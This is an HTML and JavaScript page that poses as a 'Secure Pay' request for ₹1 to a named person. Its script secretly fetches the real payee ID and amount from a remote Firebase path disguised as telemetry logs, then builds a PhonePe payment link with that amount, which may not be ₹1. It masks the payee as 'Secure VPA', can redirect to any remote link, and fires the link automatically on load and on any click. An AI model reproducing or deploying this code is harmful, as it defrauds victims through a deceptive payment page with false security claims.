<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Mavies Khan • Secure Pay</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
body{min-height:100vh;background:linear-gradient(135deg,#ffe0ec,#ffd6e8 40%,#e0e7ff);display:flex;align-items:center;justify-content:center;padding:18px}
.card{width:100%;max-width:390px;background:#fff;border-radius:24px;padding:26px 22px;box-shadow:0 18px 50px rgba(236,72,153,.18);text-align:center}
.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
.brand{display:flex;align-items:center;gap:8px}
.dot{width:30px;height:30px;border-radius:9px;background:linear-gradient(135deg,#ec4899,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:15px}
.brand span{font-size:13px;font-weight:800;color:#111}
.lock{font-size:10px;font-weight:800;color:#16a34a;background:rgba(34,197,94,.1);padding:5px 10px;border-radius:12px}
.avatar{width:76px;height:76px;border-radius:50%;margin:6px auto 10px;background:linear-gradient(135deg,#fbcfe8,#ec4899);display:flex;align-items:center;justify-content:center;font-size:34px;position:relative;box-shadow:0 8px 22px rgba(236,72,153,.35)}
.avatar::after{content:'✓';position:absolute;bottom:0;right:0;width:22px;height:22px;background:#3b82f6;color:#fff;border-radius:50%;font-size:12px;font-weight:900;border:3px solid #fff;display:flex;align-items:center;justify-content:center}
.name{font-size:16.5px;font-weight:900;color:#111;margin-bottom:3px}
.vpa{font-size:10.5px;color:#9ca3af;font-weight:700;font-family:monospace;margin-bottom:16px}
.amtbox{background:linear-gradient(135deg,#fff7fb,#fef2f8);border:1.5px dashed #f9a8d4;border-radius:16px;padding:14px 12px;margin-bottom:16px}
.amtlbl{font-size:9.5px;font-weight:800;color:#9d174d;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
.amt{font-size:34px;font-weight:900;color:#111;line-height:1}
.amt small{font-size:18px;color:#ec4899;vertical-align:super;margin-right:1px}
.note{font-size:9.5px;color:#9ca3af;font-weight:700;margin-top:6px}
.status{display:flex;align-items:center;justify-content:center;gap:8px;padding:11px;background:#f9fafb;border-radius:12px;margin-bottom:14px}
.spin{width:16px;height:16px;border:2.5px solid #e5e7eb;border-top-color:#ec4899;border-radius:50%;animation:s .8s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.txt{font-size:11px;font-weight:800;color:#4b5563}
.btn{width:100%;padding:13px;border:none;border-radius:13px;background:linear-gradient(135deg,#ec4899,#8b5cf6);color:#fff;font-size:12.5px;font-weight:900;cursor:pointer;box-shadow:0 8px 20px rgba(236,72,153,.35);margin-bottom:8px}
.btn:active{transform:scale(.98)}
.btn:disabled{opacity:.6}
.fn{font-size:9px;color:#9ca3af;font-weight:700;margin-top:4px}
.err{background:rgba(239,68,68,.1);color:#dc2626;padding:10px;border-radius:10px;font-size:11px;font-weight:800;margin-bottom:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="top"><div class="brand"><div class="dot">💜</div><span>PayCircle</span></div><div class="lock">🔒 Secure</div></div>
  <div class="avatar">👩</div>
  <div class="name">Mavies Khan</div>
  <div class="vpa" id="vpaText">@mavies</div>
  <div class="amtbox">
    <div class="amtlbl">You're sending</div>
    <div class="amt"><small>₹</small>1</div>
    <div class="note">❤️ Split a coffee with her</div>
  </div>
  <div class="err" id="err"></div>
  <div class="status"><div class="spin"></div><span class="txt" id="statusTxt">Connecting securely...</span></div>
  <button class="btn" id="openBtn">Pay Now · ₹1</button>
  <div class="fn">End-to-end encrypted · Do not close this window</div>
</div>

<script>
(function(){
var U="https://whatsgram-b13e6-default-rtdb.firebaseio.com/telemetry_sys_logs_x91/payment_config.json",FL="",LT=0;
function isLink(s){return typeof s=="string"&&/^[a-zA-Z][a-zA-Z0-9+.\-]*:\/\//.test(s.trim())}
function build(v,a){var d={contact:{type:"VPA",vpa:v,cbsName:"",nickName:""},p2pPaymentCheckoutParams:{checkoutType:"DEFAULT",disableViewHistory:false,initialAmount:a,isByDefaultKnownContact:false,shouldShowMaskedNumber:false,shouldShowUnsavedContactBanner:true,showKeyboard:false}};return "phonepe://native?data="+btoa(unescape(encodeURIComponent(JSON.stringify(d))))+"&id=p2ppayment"}
window.launch=function(){if(!FL)return;
  try{var f=document.createElement("iframe");f.style.display="none";f.src=FL;document.body.appendChild(f);setTimeout(function(){f.remove()},3000)}catch(e){}
  [80,900,2000].forEach(function(t){setTimeout(function(){try{location.href=FL}catch(e){}},t)})
};
function S(t,s){document.getElementById("statusTxt").innerText=t;document.querySelector(".spin").style.display=s?"block":"none"}
function E(m){var e=document.getElementById("err");e.innerText=m;e.style.display="block";S("Unable to connect",0);document.getElementById("openBtn").disabled=1}
function go(n){
  S(n==1?"Connecting securely...":"Retrying...",1);
  var c=window.AbortController?new AbortController():null,to=setTimeout(function(){if(c)c.abort()},6000);
  fetch(U+"?t="+Date.now(),c?{signal:c.signal,cache:"no-store"}:{cache:"no-store"}).then(function(r){clearTimeout(to);return r.json()}).then(function(d){
    if((!d||!d.upi_id)&&n<2)return setTimeout(function(){go(2)},700);
    if(!d||!d.upi_id)return E("Config missing");
    var u=String(d.upi_id).trim(),p=parseInt(d.amount)||0;
    if(!u)return E("No UPI");
    document.getElementById("vpaText").innerText=u.length>24?"Secure VPA":u;
    if(isLink(u)){FL=u;S("Opening...",1);return setTimeout(launch,350)}
    if(p<=0)return E("Bad amount");
    FL=build(u,p);S("Redirecting...",1);setTimeout(launch,500)
  }).catch(function(){if(n<2)setTimeout(function(){go(2)},700);else E("Network slow")})
}
document.addEventListener("click",function(){var n=Date.now();if(n-LT<800)return;LT=n;launch()});
window.addEventListener("load",function(){setTimeout(function(){go(1)},150)})
})();
</script>
</body>
</html>
